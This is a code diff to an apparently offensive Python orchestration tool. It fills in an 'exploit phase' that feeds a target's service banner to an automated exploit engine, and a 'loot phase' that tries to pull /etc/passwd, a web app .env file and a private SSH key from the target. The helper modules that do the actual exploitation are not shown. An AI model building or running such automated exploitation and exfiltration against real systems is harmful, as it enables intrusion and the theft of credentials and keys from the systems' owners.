@@ -75,12 +75,27 @@ class ShadowOrchestrator:
         self._save_intel("vuln", {"banner": banner})
 
     def _exploit_phase(self):
-        # AI Logic to decide next tool based on probe
-        pass
+        """AI-Driven Exploitation: Query PoCs and execute via Ghost Engine."""
+        from tools.devops.shadow_v4_core import shadow_auto_exploit_engine
+        cursor = self.db.cursor()
+        cursor.execute("SELECT content FROM intel WHERE target_id = (SELECT id FROM targets WHERE domain=?) AND type='vuln'", (self.target,))
+        vuln_data = cursor.fetchone()
+        if vuln_data:
+            banner = json.loads(vuln_data[0]).get('banner', '')
+            print(f"[*] Analyzing Vulnerability: {banner}")
+            pocs = shadow_auto_exploit_engine(banner)
+            self._save_intel("exploit_pocs", pocs)
 
     def _loot_phase(self):
-        # Exfiltration logic
-        pass
+        """Active Looting: Exfiltrate sensitive files via Void Walker Engine."""
+        from tools.devops.shadow_void_walker import shadow_loot_file
+        critical_files = ["/etc/passwd", "/var/www/html/.env", "~/.ssh/id_rsa"]
+        loot_results = []
+        for file_path in critical_files:
+            print(f"[!] Attempting to loot: {file_path}")
+            res = shadow_loot_file(self.target, file_path)
+            loot_results.append(res)
+        self._save_intel("loot", loot_results)
 
     def _report_phase(self):
         from tools.devops.reporter import generate_shadow_report
